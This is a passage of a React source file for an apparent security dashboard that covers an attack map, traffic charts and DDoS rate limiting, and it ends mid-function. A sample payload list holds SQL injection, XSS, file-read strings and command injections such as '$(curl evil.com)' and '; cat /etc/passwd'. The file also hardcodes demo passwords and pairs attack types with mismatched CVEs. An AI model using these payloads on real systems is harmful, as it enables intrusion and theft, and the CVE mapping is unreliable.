import React, { useState, useEffect, createContext, useContext, useSyncExternalStore, useMemo } from 'react';

import { BrowserRouter, Routes, Route, Navigate, Outlet, NavLink, useNavigate, useParams, Link } from 'react-router-dom';
import { motion, AnimatePresence, useScroll, useTransform, useMotionValue, useSpring } from 'framer-motion';
import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer } from 'recharts';
import { MapContainer, TileLayer, Marker, Polyline, Tooltip as MapTooltip } from 'react-leaflet';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import {
  HiShieldCheck,
  HiOutlineBolt,
  HiOutlineGlobeAlt,
  HiOutlineCpuChip,
  HiOutlineDocumentText,
  HiOutlineMagnifyingGlass,
  HiOutlineBell,
  HiOutlineUser,
  HiArrowRightOnRectangle,
  HiServer,
  HiArrowRight,
  HiOutlineGlobeAmericas,
  HiOutlineServerStack,
  HiCheck,
  HiOutlineLockClosed,
  HiOutlineKey,
  HiOutlineFingerPrint,
  HiOutlineIdentification,
  HiOutlineShieldCheck
} from 'react-icons/hi2';
import { PREMIUM_FEATURES, deriveTierFromUser, featureGateForTier } from './lib/tierGates';
import { normalizeDomainInput, formatSiteUrl } from './lib/siteUtils';
import './components/Layout.css';
import './pages/Landing.css';
import './pages/Login.css';
import './pages/Dashboard.css';
import './pages/LiveSOC.css';
import './pages/AttackGeo.css';
import './pages/ThreatIntel.css';
import './pages/OpsReports.css';

const ATTACK_TYPES = ['SQLi', 'XSS', 'LFI', 'CMDi'];
const SEVERITIES = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];
const COUNTRIES = ['Russia', 'China', 'North Korea', 'Iran', 'Brazil', 'Netherlands', 'Germany', 'India', 'USA', 'Romania'];

const IP_GEO = {
  '185.220.101.34': { city: 'Berlin', country: 'Germany', lat: 52.52, lng: 13.405 },
  '91.132.147.22': { city: 'Moscow', country: 'Russia', lat: 55.7558, lng: 37.6173 },
  '203.0.113.91': { city: 'Mumbai', country: 'India', lat: 19.076, lng: 72.8777 },
  '45.155.205.17': { city: 'Bucharest', country: 'Romania', lat: 44.4268, lng: 26.1025 },
  '194.26.192.64': { city: 'Tehran', country: 'Iran', lat: 35.6892, lng: 51.389 },
  '171.25.193.78': { city: 'Pyongyang', country: 'North Korea', lat: 39.0392, lng: 125.7625 },
  '62.102.148.68': { city: 'Sao Paulo', country: 'Brazil', lat: -23.5558, lng: -46.6396 },
  '198.51.100.14': { city: 'New York', country: 'USA', lat: 40.7128, lng: -74.006 },
  '23.129.64.100': { city: 'Rotterdam', country: 'Netherlands', lat: 51.9244, lng: 4.4777 },
  '109.70.100.18': { city: 'Shanghai', country: 'China', lat: 31.2304, lng: 121.4737 },
  '176.10.104.240': { city: 'Frankfurt', country: 'Germany', lat: 50.1109, lng: 8.6821 },
  '51.15.43.205': { city: 'Delhi', country: 'India', lat: 28.6139, lng: 77.209 },
  '104.244.76.13': { city: 'Amsterdam', country: 'Netherlands', lat: 52.3676, lng: 4.9041 },
  '209.141.47.4': { city: 'Los Angeles', country: 'USA', lat: 34.0522, lng: -118.2437 },
  '77.247.181.163': { city: 'Beijing', country: 'China', lat: 39.9042, lng: 116.4074 },
  '199.249.230.87': { city: 'Hamburg', country: 'Germany', lat: 53.5511, lng: 9.9937 },
};

const COUNTRY_COORDS = {
  Russia: { lat: 55.7558, lng: 37.6173 },
  China: { lat: 39.9042, lng: 116.4074 },
  'North Korea': { lat: 39.0392, lng: 125.7625 },
  Iran: { lat: 35.6892, lng: 51.389 },
  Brazil: { lat: -23.5558, lng: -46.6396 },
  Netherlands: { lat: 52.3676, lng: 4.9041 },
  Germany: { lat: 52.52, lng: 13.405 },
  India: { lat: 28.6139, lng: 77.209 },
  USA: { lat: 40.7128, lng: -74.006 },
  Romania: { lat: 44.4268, lng: 26.1025 },
};

const DEFAULT_TARGET_SITE = {
  name: 'Protected Site',
  city: 'Dehradun',
  country: 'India',
  lat: 30.3165,
  lng: 78.0322,
};

const IP_POOL = [
  '185.220.101.34', '91.132.147.22', '203.0.113.91', '45.155.205.17',
  '194.26.192.64', '171.25.193.78', '62.102.148.68', '198.51.100.14',
  '23.129.64.100', '109.70.100.18', '176.10.104.240', '51.15.43.205',
  '104.244.76.13', '209.141.47.4', '77.247.181.163', '199.249.230.87',
];

const PAYLOADS = {
  SQLi: ["' OR 1=1 --", 'UNION SELECT * FROM users', "'; DROP TABLE --", "1' AND SLEEP(5)--"],
  XSS: ['<script>alert(1)</script>', '<img onerror=alert(1)>', '"><svg onload=alert()>', "javascript:alert('XSS')"],
  LFI: ['../../etc/passwd', '....//....//etc/shadow', '/proc/self/environ', 'php://filter/convert.base64-encode'],
  CMDi: ['; cat /etc/passwd', '| whoami', '$(curl evil.com)', '`id`'],
};

const CVE_DB = {
  SQLi: {
    cve_id: 'CVE-2024-23108',
    cvss: 9.8,
    severity: 'CRITICAL',
    published: '2024-02-05',
    desc: 'Fortinet FortiSIEM supervisor allows unauthenticated attackers to execute commands via crafted API requests.',
  },
  XSS: {
    cve_id: 'CVE-2024-21388',
    cvss: 6.5,
    severity: 'MEDIUM',
    published: '2024-01-26',
    desc: 'Microsoft Edge Chromium-based allows an attacker to install extensions without user interaction.',
  },
  LFI: {
    cve_id: 'CVE-2024-0204',
    cvss: 9.8,
    severity: 'CRITICAL',
    published: '2024-01-22',
    desc: 'Fortra GoAnywhere MFT authentication bypass allows unauthorized admin access through path traversal.',
  },
  CMDi: {
    cve_id: 'CVE-2024-3400',
    cvss: 10,
    severity: 'CRITICAL',
    published: '2024-04-12',
    desc: 'Palo Alto PAN-OS GlobalProtect command injection allows unauthenticated remote code execution.',
  },
};

const CERTIN_ADVISORIES = [
  { id: 'CIAD-2024-0021', title: 'Multiple Vulnerabilities in Mozilla Firefox', severity: 'HIGH', desc: 'Multiple vulnerabilities reported in Mozilla Firefox which could allow code execution.' },
  { id: 'CIAD-2024-0019', title: 'Vulnerability in Apache Struts2', severity: 'CRITICAL', desc: 'A vulnerability in Apache Struts2 could allow remote code execution.' },
  { id: 'CIAD-2024-0017', title: 'Multiple Vulnerabilities in Google Chrome', severity: 'HIGH', desc: 'Multiple vulnerabilities have been reported in Google Chrome desktop browser.' },
  { id: 'CIAD-2024-0015', title: 'Vulnerability in Linux Kernel', severity: 'HIGH', desc: 'A vulnerability in Linux Kernel could allow privilege escalation.' },
  { id: 'CIAD-2024-0013', title: 'Vulnerabilities in Cisco Products', severity: 'MEDIUM', desc: 'Multiple vulnerabilities reported in various Cisco products.' },
  { id: 'CIAD-2024-0011', title: 'Vulnerability in OpenSSL', severity: 'HIGH', desc: 'A vulnerability in OpenSSL could be exploited by a remote attacker.' },
];

const USERS = [
  { username: 'admin', password: 'admin123', name: 'AutoShield Admin', email: 'admin@autoshield.ai', role: 'admin' },
  { username: 'analyst', password: 'analyst123', name: 'SOC Analyst', email: 'analyst@autoshield.ai', role: 'analyst' },
];

function calculateBezierPoints(p1, p2) {
  const points = [];
  const midX = (p1[1] + p2[1]) / 2;
  const midY = (p1[0] + p2[0]) / 2;

  // Create arc midpoint by offsetting perpendicular to the line
  const dx = p1[1] - p2[1];
  const dy = p1[0] - p2[0];
  const length = Math.sqrt(dx * dx + dy * dy);

  // Altitude depends on distance
  const altitude = length * 0.15;
  const cp = [midY + (dx / length) * altitude, midX - (dy / length) * altitude];

  for (let i = 0; i <= 20; i++) {
    const t = i / 20;
    const lat = (1 - t) ** 2 * p1[0] + 2 * (1 - t) * t * cp[0] + t ** 2 * p2[0];
    const lng = (1 - t) ** 2 * p1[1] + 2 * (1 - t) * t * cp[1] + t ** 2 * p2[1];
    points.push([lat, lng]);
  }
  return points;
}

function getGeoForIP(ip, fallbackCountry = 'USA') {
  const known = IP_GEO[ip];
  if (known) return known;

  const country = COUNTRY_COORDS[fallbackCountry] ? fallbackCountry : 'USA';
  const base = COUNTRY_COORDS[country];
  const ipSeed = String(ip)
    .split('.')
    .reduce((sum, part) => sum + (Number.parseInt(part, 10) || 0), 0);

  return {
    city: `${country} Network`,
    country,
    lat: Number((base.lat + ((ipSeed % 7) - 3) * 0.18).toFixed(4)),
    lng: Number((base.lng + ((ipSeed % 9) - 4) * 0.18).toFixed(4)),
  };
}

function getLocationKey(city, country, lat, lng) {
  return `${city || 'Unknown'}|${country || 'Unknown'}|${lat}|${lng}`;
}

const TRAFFIC_WINDOWS = [
  { key: '1h', label: '1H', longLabel: 'Last 1 Hour' },
  { key: '1d', label: '1D', longLabel: 'Last 1 Day' },
  { key: '1w', label: '1W', longLabel: 'Last 1 Week' },
  { key: '1m', label: '1M', longLabel: 'Last 1 Month' },
  { key: 'all', label: 'ALL', longLabel: 'Since Connected' },
];

function buildTrafficSeries(events, windowKey) {
  const now = Date.now();
  let bucketCount = 12;
  let bucketMs = 5 * 60 * 1000;
  let startTime = now - 60 * 60 * 1000;

  if (windowKey === '1d') {
    bucketCount = 24;
    bucketMs = 60 * 60 * 1000;
    startTime = now - 24 * 60 * 60 * 1000;
  } else if (windowKey === '1w') {
    bucketCount = 7;
    bucketMs = 24 * 60 * 60 * 1000;
    startTime = now - 7 * 24 * 60 * 60 * 1000;
  } else if (windowKey === '1m') {
    bucketCount = 30;
    bucketMs = 24 * 60 * 60 * 1000;
    startTime = now - 30 * 24 * 60 * 60 * 1000;
  } else if (windowKey === 'all') {
    const timestamps = (events || [])
      .map((ev) => new Date(ev.timestamp || 0).getTime())
      .filter((ts) => Number.isFinite(ts) && ts > 0);
    const oldest = timestamps.length ? Math.min(...timestamps) : now - 24 * 60 * 60 * 1000;
    const span = Math.max(now - oldest, 24 * 60 * 60 * 1000);
    bucketCount = 12;
    bucketMs = Math.max(Math.floor(span / bucketCount), 60 * 60 * 1000);
    startTime = now - (bucketCount * bucketMs);
  }

  const buckets = Array.from({ length: bucketCount }, (_, i) => {
    const slotStart = startTime + (i * bucketMs);
    const date = new Date(slotStart);
    let t = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });

    if (windowKey === '1w' || windowKey === '1m') {
      t = date.toLocaleDateString([], { month: 'short', day: 'numeric' });
    } else if (windowKey === 'all') {
      t = date.toLocaleDateString([], { month: 'short', day: 'numeric' });
    }

    return { t, attacks: 0, blocked: 0 };
  });

  (events || []).forEach((ev) => {
    const ts = new Date(ev.timestamp || 0).getTime();
    if (!Number.isFinite(ts) || ts < startTime || ts > now) return;
    const idx = Math.min(bucketCount - 1, Math.max(0, Math.floor((ts - startTime) / bucketMs)));
    buckets[idx].attacks += 1;
    if (ev.action === 'BLOCKED') buckets[idx].blocked += 1;
  });

  return buckets;
}

function MiniTicker({ log }) {
  const latestStates = log
    .filter(e => e.mitigation_phase)
    .slice(0, 3);

  if (latestStates.length === 0) return null;

  return (
    <div style={{ height: 32, overflow: 'hidden', background: 'rgba(0,0,0,0.5)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 8, display: 'flex', alignItems: 'center', padding: '0 12px', gap: 16 }}>
      <div style={{ fontSize: 9, fontWeight: 700, color: 'var(--cyan)', fontFamily: 'var(--mono)', borderRight: '1px solid rgba(255,255,255,0.1)', paddingRight: 16 }}>LIVE MITIGATIONS</div>
      <div className="ticker-scroll" style={{ display: 'flex', gap: 24 }}>
        {latestStates.map((ev, i) => (
          <motion.div key={i} initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} style={{ fontSize: 10, display: 'flex', alignItems: 'center', gap: 8, color: 'white' }}>
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: ev.mitigation_phase === 'FIXED' ? 'var(--green)' : 'var(--red)', animation: ev.mitigation_phase === 'FIXED' ? 'none' : 'pulse-dot 1s infinite' }} />
            <span style={{ fontWeight: 800 }}>{ev.mitigation_phase}</span>
            <span style={{ color: 'var(--muted2)' }}>{ev.attack_type} FROM {ev.src_ip}</span>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function SystemMetrics({ metrics }) {
  const nodes = [
    { label: 'CPU LOAD', val: metrics.cpu || 0, color: 'var(--cyan)' },
    { label: 'MEM UTIL', val: metrics.memory?.percent || metrics.memory || 0, color: 'var(--green)' },
    { label: 'DISK I/O', val: metrics.disk?.percent || metrics.disk || 0, color: 'var(--orange)' },
  ];
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      {nodes.map(n => (
        <div key={n.label}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 9, marginBottom: 5, color: 'var(--muted2)', fontWeight: 700 }}>
            <span>{n.label}</span>
            <span style={{ color: 'white' }}>{Math.round(n.val)}%</span>
          </div>
          <div style={{ height: 4, background: 'rgba(255,255,255,0.05)', borderRadius: 2, overflow: 'hidden' }}>
            <motion.div initial={{ width: 0 }} animate={{ width: `${n.val}%` }} style={{ height: '100%', background: n.color, borderRadius: 2 }} />
          </div>
        </div>
      ))}
    </div>
  );
}

// SOC Global Constants
const API_URL = (() => {
  // First priority: Environment variable (for production)
  const fromEnv = String(import.meta.env?.VITE_API_URL || '').trim();
  if (fromEnv) {
    console.log('Using API URL from environment:', fromEnv);
    return fromEnv.replace(/\/$/, '');
  }

  // Fallback for development
  if (typeof window === 'undefined') {
    console.log('SSR mode: using localhost:8505');
    return 'http://localhost:8505';
  }

  const host = window.location.hostname;
  if (!host || host === 'localhost' || host === '127.0.0.1') {
    console.log('Local development: using localhost:8505');
    return 'http://localhost:8505';
  }

  // For other hosts, assume backend is on same host with port 8505
  const fallbackUrl = `http://${host}:8505`;
  console.log('Using fallback API URL:', fallbackUrl);
  return fallbackUrl;
})();

// CRITICAL DEBUG: Log the final API_URL
console.log('FINAL API_URL =', API_URL);
console.log('VITE_API_URL env =', import.meta.env?.VITE_API_URL);
const DEFAULT_DOMAINS = [];

const engine = (() => {
  let listeners = new Set();
  let stateVersion = 0;

  let token = localStorage.getItem('as_token');
  let eventSource = null;
  let wsSocket = null;
  let streamSeq = 0;
  let syncTimer = null;
  let retryCount = 0;
  let localAutoPilotTimer = null;
  let localAutoPilotActive = false;
  let connection = { online: false, mode: 'booting', lastError: '' };
  let domains = (() => {
    try {
      const raw = localStorage.getItem('as_domains');
      return raw ? JSON.parse(raw) : DEFAULT_DOMAINS;
    } catch (_) {
      return DEFAULT_DOMAINS;
    }
  })();

  let log = [];
  let blockedIPs = new Set();
  let siteHealth = new Map();
  let stats = {
    total: 0, blocked: 0, blockRate: 0, visitors: 0,
    byType: {}, byCountry: {}, statusCodes: {}, topPaths: {}, wafHits: {},
    system: { cpu: 0, memory: { percent: 0 }, disk: { percent: 0 }, uptime: 0 }
  };
  let backendHealth = {
    status: 'unknown',
    version: '',
    firewall_mode: 'unknown',
    host_firewall_enforced: false,
    root_mode: false,
    timestamp: null,
  };

  let autoPilotActive = false;
  let simulatorStatus = { running: false, mode: 'Smart AutoPilot' };

  // ═══ PREMIUM TIER SYSTEM ═══
  let userTier = localStorage.getItem('as_tier') || 'free'; // 'free' | 'premium'
  // ═══ DDoS DETECTION ENGINE ═══
  const ipRequestWindow = {}; // { ip: [timestamps] }
  const DDOS_WINDOW_MS = 10000; // 10 second window
  const DDOS_THRESHOLD_FREE = 30; // requests per window for free tier
  const DDOS_THRESHOLD_PREMIUM = 50; // configurable for premium
  let ddosState = {
    active: false,
    mitigatedCount: 0,
    topAttackers: [],
    detectedAt: null,
    requestsPerSecond: 0,
    peakRPS: 0,
  };

  // ═══ RATE LIMITER ═══
  const rateLimitConfig = {
    windowMs: 60000, // 1 minute
    maxRequests: userTier === 'premium' ? 200 : 60,
    escalationThreshold: 3, // warnings before auto-block
  };
  const ipWarnings = {}; // { ip: warningCount }
  let rateLimitedIPs = new Set();

  // ═══ NOTIFICATION SYSTEM ═══
  let notifications = [];
  let notifId = 0;
  const MAX_VISIBLE_NOTIFICATIONS = 3;   // max popup toasts at once
  const MAX_STORED_NOTIFICATIONS = 100;  // history panel limit

  // ═══ GEO-BLOCKING ═══
  let blockedCountries = new Set(JSON.parse(localStorage.getItem('as_blocked_countries') || '[]'));

  // ═══ WHITELISTED IPs ═══
  let whitelistedIPs = new Set(JSON.parse(localStorage.getItem('as_whitelist') || '[]'));

  const addNotification = (type, title, message, severity = 'info') => {
    const notif = {
      id: ++notifId,
      type, // 'attack_blocked', 'ddos_detected', 'ip_blocked', 'lockdown', 'rate_limit', 'system'
      title,
      message,
      severity, // 'critical', 'high', 'medium', 'low', 'info', 'success'
      timestamp: new Date().toISOString(),
      read: false,
      visible: true,
    };
    notifications.unshift(notif);
    // Trim storage history
    if (notifications.length > MAX_STORED_NOTIFICATIONS) notifications.pop();
    // Auto-hide popup after 6s
    setTimeout(() => {
      const idx = notifications.findIndex(n => n.id === notif.id);
      if (idx !== -1) {
        notifications[idx].visible = false;
        notify();
      }
    }, 6000);
    notify();
    return notif;
  };

  const clearNotifications = () => {
    notifications = [];
    notify();
  };

  const notify = () => {
    stateVersion++;
    listeners.forEach((fn) => fn());
  };

  const subscribe = (fn) => {
    listeners.add(fn);
    return () => listeners.delete(fn);
  };

  const getHeaders = () => {
    const activeToken = token || localStorage.getItem('as_token') || '';
    const headers = { 'Content-Type': 'application/json' };
    if (activeToken) headers['X-AutoShield-Key'] = activeToken;
    return headers;
  };

  const requestWithTimeout = async (url, options = {}, timeoutMs = 10000) => {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      return await fetch(url, { ...options, signal: controller.signal });
    } finally {
      clearTimeout(timer);
    }
  };

  const applyUserTier = (tier, options = {}) => {
    const nextTier = tier === 'premium' ? 'premium' : 'free';
    userTier = nextTier;
    localStorage.setItem('as_tier', nextTier);
    rateLimitConfig.maxRequests = nextTier === 'premium' ? 200 : 60;
    if (!options.silent) {
      addNotification('system', nextTier === 'premium' ? '⭐ Premium Activated' : '📦 Switched to Free', nextTier === 'premium' ? 'All enterprise features unlocked.' : 'Enterprise features are now locked.', nextTier === 'premium' ? 'success' : 'info');
    }
    notify();
  };

  const syncDomainsFromContext = (context) => {
    const siteList = Array.isArray(context?.sites) ? context.sites : [];
    if (!siteList.length) return;

    const normalized = siteList
      .filter((s) => s && s.id && s.domain)
      .map((s) => ({
        domain: normalizeDomainInput(s.domain),
        id: s.id,
        key: s.api_key || '',
        plan: s.plan || 'free',
        created: s.created_at || new Date().toISOString(),
        name: s.name || s.domain,
        upstream_url: s.upstream_url || '',
      }))
      .filter((s) => s.domain);

    if (!normalized.length) return;

    const backendIds = new Set(normalized.map((s) => s.id));
    const localOnly = domains.filter((d) => d.isLocal && !backendIds.has(d.id));

    domains = [...normalized, ...localOnly];
    localStorage.setItem('as_domains', JSON.stringify(domains));
    notify();
  };

  const getSiteHealthKey = (siteId, domain) => {
    if (siteId) return `id:${siteId}`;
    const normalizedDomain = normalizeDomainInput(domain);
    return normalizedDomain ? `domain:${normalizedDomain}` : 'unknown';
  };

  const getHealthStatusLabel = (health) => {
    if (!health) return 'UNKNOWN';
    if (health.reachable) return 'UP';
    if (health.status_code && health.status_code < 500) return 'DEGRADED';
    return 'DOWN';
  };

  const refreshSiteHealth = async (siteId, domain = '') => {
    const key = getSiteHealthKey(siteId, domain);
    const normalizedDomain = normalizeDomainInput(domain);
    if (!siteId && !normalizedDomain) {
      const fallback = {
        reachable: false,
        status_code: null,
        latency_ms: null,
        error: 'Missing site id and domain for health probe',
        checked_at: new Date().toISOString(),
        status: 'UNKNOWN',
      };
      siteHealth.set(key, fallback);
      notify();
      return fallback;
    }

    try {
      const query = normalizedDomain
        ? `domain=${encodeURIComponent(normalizedDomain)}`
        : `site_id=${encodeURIComponent(siteId)}`;
      const res = await fetch(`${API_URL}/api/websites/health?${query}`, { headers: getHeaders() });
      if (!res.ok) throw new Error(`Health probe failed (${res.status})`);
      const payload = await res.json();
      const normalized = { ...payload, status: payload.status || getHealthStatusLabel(payload) };
      siteHealth.set(key, normalized);
      notify();
      return normalized;
    } catch (err) {
      const failed = {
        reachable: false,
        status_code: null,
        latency_ms: null,
        error: String(err?.message || err),
        checked_at: new Date().toISOString(),
        status: 'DOWN',
      };
      siteHealth.set(key, failed);
      notify();
      return failed;
    }
  };

  // ═══ DDoS DETECTION LOGIC ═══
  const trackRequest = (ip) => {
    if (whitelistedIPs.has(ip)) return;
    const now = Date.now();
    if (!ipRequestWindow[ip]) ipRequestWindow[ip] = [];
    ipRequestWindow[ip].push(now);
    // Purge old entries
    ipRequestWindow[ip] = ipRequestWindow[ip].filter(t => now - t < DDOS_WINDOW_MS);

    const count = ipRequestWindow[ip].length;
    const threshold = userTier === 'premium' ? DDOS_THRESHOLD_PREMIUM : DDOS_THRESHOLD_FREE;

    // Calculate RPS
    const rps = Math.round(count / (DDOS_WINDOW_MS / 1000));
    ddosState.requestsPerSecond = rps;
    if (rps > ddosState.peakRPS) ddosState.peakRPS = rps;

    // DDoS detection
    if (count >= threshold && !blockedIPs.has(ip)) {
      // Auto-block this IP
      blockedIPs.add(ip);
      ddosState.mitigatedCount++;

      // Update top attackers
      const existing = ddosState.topAttackers.find(a => a.ip === ip);
      if (existing) {
        existing.count = count;
        existing.lastSeen = new Date().toISOString();
      } else {
        ddosState.topAttackers.unshift({ ip, count, lastSeen: new Date().toISOString(), geo: getGeoForIP(ip) });
        if (ddosState.topAttackers.length > 10) ddosState.topAttackers.pop();
      }

      if (!ddosState.active) {
        ddosState.active = true;
        ddosState.detectedAt = new Date().toISOString();
        addNotification('ddos_detected', '🚨 DDoS Attack Detected', `Volumetric attack from ${ip} (${count} req/${DDOS_WINDOW_MS / 1000}s). Auto-mitigation engaged.`, 'critical');
      }

      addNotification('ip_blocked', '🛡️ IP Auto-Blocked', `${ip} blocked by DDoS shield (${count} requests in ${DDOS_WINDOW_MS / 1000}s window)`, 'high');

      // Also try to block via API
      fetch(`${API_URL}/block`, { method: 'POST', headers: getHeaders(), body: JSON.stringify({ ip, reason: `DDoS: ${count} req/${DDOS_WINDOW_MS / 1000}s` }) }).catch(() => { });
    }

    // Rate limiting check (softer threshold)
    const rateThreshold = Math.floor(threshold * 0.5);
    if (count >= rateThreshold && !rateLimitedIPs.has(ip) && !blockedIPs.has(ip)) {
      rateLimitedIPs.add(ip);
      ipWarnings[ip] = (ipWarnings[ip] || 0) + 1;

      if (ipWarnings[ip] >= rateLimitConfig.escalationThreshold) {
        blockedIPs.add(ip);
        addNotification('rate_limit', '⚡ Rate Limit Escalation', `${ip} auto-blocked after ${ipWarnings[ip]} rate limit violations`, 'high');
        fetch(`${API_URL}/block`, { method: 'POST', headers: getHeaders(), body: JSON.stringify({ ip, reason: `Rate limit: ${ipWarnings[ip]} violations` }) }).catch(() => { });
      } else {
        addNotification('rate_limit', '⏱️ Rate Limited', `${ip} throttled (${count} req/${DDOS_WINDOW_MS / 1000}s, warning ${ipWarnings[ip]}/${rateLimitConfig.escalationThreshold})`, 'medium');
      }
    }

    // Check geo-blocking
    const geo = getGeoForIP(ip);
    if (blockedCountries.has(geo.country) && !blockedIPs.has(ip)) {
      blockedIPs.add(ip);
      addNotification('ip_blocked', '🌐 Geo-Blocked', `${ip} from ${geo.country} blocked by geographic policy`, 'medium');
    }
  };

  // Auto-decay DDoS state
  setInterval(() => {
    if (ddosState.active) {
      const now = Date.now();
      // Check if any IP is still flooding
      let anyActive = false;
      for (const ip of Object.keys(ipRequestWindow)) {
        ipRequestWindow[ip] = ipRequestWindow[ip].filter(t => now - t < DDOS_WINDOW_MS);
        if (ipRequestWindow[ip].length >= DDOS_THRESHOLD_FREE * 0.3) anyActive = true;
      }
      if (!anyActive) {
        ddosState.active = false;
        ddosState.requestsPerSecond = 0;
        addNotification('system', '✅ DDoS Mitigated', 'Attack traffic has subsided. Defense posture returning to normal.', 'success');
      }
    }
    // Decay rate limited IPs
    rateLimitedIPs.clear();
  }, 15000);

  const normalizeEvent = (event) => {
    if (!event || typeof event !== 'object') return event;
    const geo = getGeoForIP(event.src_ip, event.country || 'USA');
    return {
      ...event,
      payload: event.payload || event.payload_snip || '',
      city: event.city || geo.city,
      country: event.country || geo.country,
      lat: typeof event.lat === 'number' ? event.lat : geo.lat,
      lng: typeof event.lng === 'number' ? event.lng : geo.lng,
    };
  };

  const deriveCountryStats = (events) => {
    const byCountry = {};
    (events || []).forEach((ev) => {
      const country = ev.country || getGeoForIP(ev.src_ip).country;
      byCountry[country] = (byCountry[country] || 0) + 1;
    });
    return byCountry;
  };

  const fetchState = async (siteId = null) => {
    const activeToken = token || localStorage.getItem('as_token');
    if (!activeToken) {
      connection = { online: false, mode: 'logged_out', lastError: 'No active session' };
      notify();
      return;
    }
    try {
      const statsUrl = siteId && siteId !== 'all' ? `${API_URL}/stats?site_id=${siteId}` : `${API_URL}/stats?site_id=all`;
      const [eventsRes, blockedRes, statsRes, simRes, telRes, healthRes] = await Promise.allSettled([
        fetch(`${API_URL}/events?limit=100`, { headers: getHeaders() }),
        fetch(`${API_URL}/blocked`, { headers: getHeaders() }),
        fetch(statsUrl, { headers: getHeaders() }),
        fetch(`${API_URL}/simulator/status`, { headers: getHeaders() }),
        fetch(`${API_URL}/telemetry/latest`, { headers: getHeaders() }),
        fetch(`${API_URL}/health`, { headers: getHeaders() })
      ]);

      const eventsResp = eventsRes.status === 'fulfilled' ? eventsRes.value : null;
      const blockedResp = blockedRes.status === 'fulfilled' ? blockedRes.value : null;
      const statsResp = statsRes.status === 'fulfilled' ? statsRes.value : null;
      const simResp = simRes.status === 'fulfilled' ? simRes.value : null;
      const telResp = telRes.status === 'fulfilled' ? telRes.value : null;
      const healthResp = healthRes.status === 'fulfilled' ? healthRes.value : null;

      if (eventsResp && (eventsResp.status === 401 || eventsResp.status === 403)) {
        // Backend rejected the token — kill session immediately
        console.warn('[AutoShield] fetchState: token rejected (401/403). Clearing session.');
        streamSeq += 1; // kill any reconnect timers
        if (eventSource) { try { eventSource.close(); } catch (_) {} eventSource = null; }
        if (wsSocket) { try { wsSocket.close(); } catch (_) {} wsSocket = null; }
        localStorage.removeItem('as_token');
        localStorage.removeItem('as_user');
        localStorage.removeItem('as_tier');
        token = null;
        connection = { online: false, mode: 'unauthorized', lastError: 'Session expired — please log in again' };
        notify();
        return;
      }

      if (eventsResp && eventsResp.ok) {
        const data = await eventsResp.json();
        const incomingLog = (data.events || data || []);
        log = incomingLog.map(normalizeEvent);

      }
      if (blockedResp && blockedResp.ok) {
        const data = await blockedResp.json();
        const bList = Array.isArray(data) ? data : (data.blocked || []);
        blockedIPs = new Set(bList.map(b => b.ip || b));
      }
      if (statsResp && statsResp.status === 403) {
        console.warn('Access denied (403). Clearing invalid token.');
        localStorage.removeItem('as_token');
        token = null;
        if (eventSource) eventSource.close();
        return;
      }
      if (statsResp && statsResp.ok) {
        stats = await statsResp.json();
        if (!stats.byCountry || Object.keys(stats.byCountry).length === 0) {
          stats.byCountry = deriveCountryStats(log);
        }
      }
      if (telResp && telResp.ok) {
        const telData = await telResp.json();
        stats.system = telData;
      }
      if (simResp && simResp.ok) {
        simulatorStatus = await simResp.json();
        autoPilotActive = simulatorStatus.running || localAutoPilotActive;
      }
      if (healthResp && healthResp.ok) {
        const healthData = await healthResp.json();
        backendHealth = {
          status: healthData.status || 'unknown',
          version: healthData.version || '',
          firewall_mode: healthData.firewall_mode || 'unknown',
          host_firewall_enforced: Boolean(healthData.host_firewall_enforced),
          root_mode: Boolean(healthData.root_mode),
          timestamp: healthData.timestamp || null,
        };
      }
      const anyOnline = Boolean(eventsResp || blockedResp || statsResp || simResp || healthResp);
      const liveMode = wsSocket ? 'websocket' : (eventSource ? 'streaming' : 'polling');
      connection = { online: anyOnline, mode: liveMode, lastError: '' };
      notify();
      return stats;  // return for per-site data binding in ManageSite
    } catch (e) {
      connection = { online: false, mode: 'offline', lastError: String(e?.message || e) };
      notify();
      return null;
    }
  };

  const connectSSE = (userToken) => {
    // — Hard guard: never connect with missing/invalid token —
    if (!userToken || userToken === 'null' || userToken === 'undefined') {
      console.warn('[AutoShield] connectSSE called with no token — aborting');
      return;
    }

    streamSeq += 1;
    const seq = streamSeq;
    const streamStartedAt = Date.now();
    let suppressHistoricNotifications = true;
    const historicalAlertQueue = [];
    const historicalAlertKeys = new Set();

    if (eventSource) eventSource.close();
    if (wsSocket) {
      try { wsSocket.close(); } catch (_) { }
      wsSocket = null;
    }
    token = userToken;
    localStorage.setItem('as_token', token);

    const queueHistoricalAlert = (kind, ev) => {
      const tsRaw = new Date(ev?.timestamp || 0).getTime();
      const ts = Number.isFinite(tsRaw) && tsRaw > 0 ? tsRaw : Date.now();
      const key = `${kind}:${ev?.id || ''}:${ev?.src_ip || ''}:${ev?.status || ''}:${ev?.action || ''}`;
      if (historicalAlertKeys.has(key)) return;
      historicalAlertKeys.add(key);
      historicalAlertQueue.push({ kind, ts, ev });
    };

    const flushHistoricalAlerts = () => {
      if (seq !== streamSeq) return;
      suppressHistoricNotifications = false;
      const topThree = historicalAlertQueue
        .sort((a, b) => b.ts - a.ts)
        .slice(0, 3)
        .reverse();
      topThree.forEach(({ kind, ev }) => {
        if (kind === 'blocked') {
          addNotification('attack_blocked', `🚫 ${ev.attack_type} Blocked`, `${ev.src_ip} — ${ev.payload?.slice(0, 60) || 'Malicious payload detected'}`, ev.severity === 'CRITICAL' ? 'critical' : 'high');
        } else if (kind === 'mitigating') {
          addNotification('system', '⚙️ Mitigation Running', `${ev.attack_type} from ${ev.src_ip} is being actively contained.`, 'medium');
        } else if (kind === 'fixed') {
          addNotification('system', '✅ Threat Fixed', `${ev.attack_type} from ${ev.src_ip} has been blocked and resolved.`, 'success');
        }
      });
      historicalAlertQueue.length = 0;
      historicalAlertKeys.clear();
    };

    setTimeout(() => {
      flushHistoricalAlerts();
    }, 4000);

    const handleIncomingEvent = (ev) => {
      try {
        retryCount = 0; // Reset on success
